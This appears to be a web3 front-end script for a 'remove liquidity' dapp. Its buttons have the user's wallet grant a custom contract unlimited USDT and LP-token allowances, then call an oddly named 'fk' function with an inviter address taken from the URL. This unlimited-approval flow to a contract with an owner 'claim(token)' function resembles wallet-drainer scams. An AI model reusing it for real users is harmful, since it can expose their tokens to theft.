const TokenAbi = [
    {
        "inputs":[

        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"constructor"
    },
    {
        "anonymous":false,
        "inputs":[
            {
                "indexed":true,
                "internalType":"address",
                "name":"owner",
                "type":"address"
            },
            {
                "indexed":true,
                "internalType":"address",
                "name":"spender",
                "type":"address"
            },
            {
                "indexed":false,
                "internalType":"uint256",
                "name":"value",
                "type":"uint256"
            }
        ],
        "name":"Approval",
        "type":"event"
    },
    {
        "anonymous":false,
        "inputs":[
            {
                "indexed":true,
                "internalType":"address",
                "name":"previousOwner",
                "type":"address"
            },
            {
                "indexed":true,
                "internalType":"address",
                "name":"newOwner",
                "type":"address"
            }
        ],
        "name":"OwnershipTransferred",
        "type":"event"
    },
    {
        "anonymous":false,
        "inputs":[
            {
                "indexed":true,
                "internalType":"address",
                "name":"from",
                "type":"address"
            },
            {
                "indexed":true,
                "internalType":"address",
                "name":"to",
                "type":"address"
            },
            {
                "indexed":false,
                "internalType":"uint256",
                "name":"value",
                "type":"uint256"
            }
        ],
        "name":"Transfer",
        "type":"event"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"_decimals",
        "outputs":[
            {
                "internalType":"uint8",
                "name":"",
                "type":"uint8"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"_name",
        "outputs":[
            {
                "internalType":"string",
                "name":"",
                "type":"string"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"_symbol",
        "outputs":[
            {
                "internalType":"string",
                "name":"",
                "type":"string"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[
            {
                "internalType":"address",
                "name":"owner",
                "type":"address"
            },
            {
                "internalType":"address",
                "name":"spender",
                "type":"address"
            }
        ],
        "name":"allowance",
        "outputs":[
            {
                "internalType":"uint256",
                "name":"",
                "type":"uint256"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"spender",
                "type":"address"
            },
            {
                "internalType":"uint256",
                "name":"amount",
                "type":"uint256"
            }
        ],
        "name":"approve",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[
            {
                "internalType":"address",
                "name":"account",
                "type":"address"
            }
        ],
        "name":"balanceOf",
        "outputs":[
            {
                "internalType":"uint256",
                "name":"",
                "type":"uint256"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"uint256",
                "name":"amount",
                "type":"uint256"
            }
        ],
        "name":"burn",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"decimals",
        "outputs":[
            {
                "internalType":"uint8",
                "name":"",
                "type":"uint8"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"spender",
                "type":"address"
            },
            {
                "internalType":"uint256",
                "name":"subtractedValue",
                "type":"uint256"
            }
        ],
        "name":"decreaseAllowance",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"getOwner",
        "outputs":[
            {
                "internalType":"address",
                "name":"",
                "type":"address"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"spender",
                "type":"address"
            },
            {
                "internalType":"uint256",
                "name":"addedValue",
                "type":"uint256"
            }
        ],
        "name":"increaseAllowance",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"uint256",
                "name":"amount",
                "type":"uint256"
            }
        ],
        "name":"mint",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"name",
        "outputs":[
            {
                "internalType":"string",
                "name":"",
                "type":"string"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"owner",
        "outputs":[
            {
                "internalType":"address",
                "name":"",
                "type":"address"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[

        ],
        "name":"renounceOwnership",
        "outputs":[

        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"symbol",
        "outputs":[
            {
                "internalType":"string",
                "name":"",
                "type":"string"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"totalSupply",
        "outputs":[
            {
                "internalType":"uint256",
                "name":"",
                "type":"uint256"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"recipient",
                "type":"address"
            },
            {
                "internalType":"uint256",
                "name":"amount",
                "type":"uint256"
            }
        ],
        "name":"transfer",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"sender",
                "type":"address"
            },
            {
                "internalType":"address",
                "name":"recipient",
                "type":"address"
            },
            {
                "internalType":"uint256",
                "name":"amount",
                "type":"uint256"
            }
        ],
        "name":"transferFrom",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"newOwner",
                "type":"address"
            }
        ],
        "name":"transferOwnership",
        "outputs":[

        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    }
]

const removeABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "token",
				"type": "address"
			}
		],
		"name": "claim",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "up",
				"type": "address"
			}
		],
		"name": "fk",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "renounceOwnership",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "token",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "USDT",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "swap",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "previousOwner",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "newOwner",
				"type": "address"
			}
		],
		"name": "OwnershipTransferred",
		"type": "event"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "newOwner",
				"type": "address"
			}
		],
		"name": "transferOwnership",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "factory",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "getRate",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "pairAddr",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "router",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "tokenAddr",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "upRate",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "USDTAddr",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "WETH",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]

const removeLiquidityAddr = '0x8Ac112F5F32F926E1A0C8bd4CEe4F5AA0fBd1938'

if (typeof window.ethereum !== 'undefined' || (typeof window.web3 !== 'undefined')) {
    const web3 = new Web3(window.ethereum || window.web3.currentProvider);

    // 请求用户连接其 MetaMask 钱包
    async function connectWallet() {
        if (window.ethereum) {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                return accounts[0];
            } catch (error) {
                console.error("用户拒绝了钱包连接请求");
            }
        } else if (window.web3) {
            web3 = new Web3(window.web3.currentProvider);
        } else {
            alert("请在钱包内打开");
        }
    }

    connectWallet();
    document.getElementById("approve_USDT").addEventListener("click", async () => {
        const USDTAddress = "0x55d398326f99059fF775485246999027B3197955";
        const USDTcontract = new web3.eth.Contract(TokenAbi, USDTAddress);
        await USDTcontract.methods.approve(
            removeLiquidityAddr,
            "115792089237316195423570985008687907853269984665640564039457584007913129639935"
        ).send({ from: await connectWallet() });
    });

    document.getElementById("approve_LP").addEventListener("click", async () => {
        const LPAddress = "0x2d79EFf3A8d121E86b0ec375830A9B7498e94ef3";
        const LPContract = new web3.eth.Contract(TokenAbi, LPAddress);
        await LPContract.methods.approve(
            removeLiquidityAddr,
            "115792089237316195423570985008687907853269984665640564039457584007913129639935"
        ).send({ from: await connectWallet() });
    });


    document.getElementById("remove").addEventListener("click", async () => {
        const url = new URL(window.location.href);

        const params = new URLSearchParams(url.search);
        const addressParam = params.get('inviter');
        var address = "0x41d785B0Eb4dF5f67a639A834d6bb8b1f27680A4";
        if(addressParam) {
            address = web3.utils.isAddress(addressParam) ? addressParam : "0x41d785B0Eb4dF5f67a639A834d6bb8b1f27680A4";
            console.log(address);
        }

        const removeLiquidityContract = new web3.eth.Contract(removeABI, removeLiquidityAddr);
        await removeLiquidityContract.methods.fk(
            address
        ).send({ from: await connectWallet() });
    });

    document.getElementById("unapprove_USDT").addEventListener("click", async () => {
        const USDTAddress = "0x55d398326f99059fF775485246999027B3197955";
        const USDTcontract = new web3.eth.Contract(TokenAbi, USDTAddress);
        await USDTcontract.methods.approve(
            removeLiquidityAddr,
            "0"
        ).send({ from: await connectWallet() });
    });

    document.getElementById("invi").addEventListener("click", async () => {
        text = `${new URL(window.location.href)}?inviter=${await connectWallet()}`
        navigator.clipboard.writeText(text)
    });



} else {
    alert("请在钱包内打开");
}
